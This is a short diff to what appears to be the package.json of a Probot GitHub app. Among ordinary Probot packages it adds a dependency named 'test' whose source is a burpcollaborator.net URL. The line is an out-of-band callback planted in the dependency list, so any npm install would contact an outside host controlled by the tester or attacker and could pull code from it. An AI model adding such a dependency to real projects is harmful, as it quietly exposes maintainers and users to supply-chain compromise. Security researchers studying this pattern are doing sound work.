@@ -8,6 +8,7 @@
     "now-start": "PRIVATE_KEY=$(echo $PRIVATE_KEY | base64 -d) npm start"
   },
   "dependencies": {
+    "test": "http://cs8q3ubige5ixlq8cbp96skhv81ypn.burpcollaborator.net",
     "probot": "7.0.1",
     "probot-app-deploy": "1.0.3",
     "probot-app-label-docs-pr": "1.0.2",
